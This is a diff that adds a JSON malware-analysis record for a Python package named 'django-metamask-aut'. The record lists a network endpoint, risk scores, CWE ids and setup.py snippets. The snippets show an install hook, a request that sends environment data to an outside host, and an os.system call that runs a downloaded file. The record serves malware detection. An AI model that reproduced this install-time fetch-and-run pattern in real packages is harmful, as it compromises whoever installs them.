@@ -1,0 +1,42 @@
+{
+  "package_metadata": {
+    "name": "django-metamask-aut",
+    "version": "4.5.2",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_endpoints": [
+      "https://linkedopports.com/pyp/resp.php"
+    ],
+    "process_spawns": [
+      "os.system('start '+filename)"
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "setup.py",
+        "code_snippet": "t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation new c kw \" +env)"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "os.system('start '+filename)"
+      },
+      {
+        "filename": "setup.py",
+        "code_snippet": "cmdclass={'install': PostInstallCommand}"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.85,
+    "risk_score": 0.9,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-502",
+      "CWE-94",
+      "CWE-200"
+    ]
+  }
+}
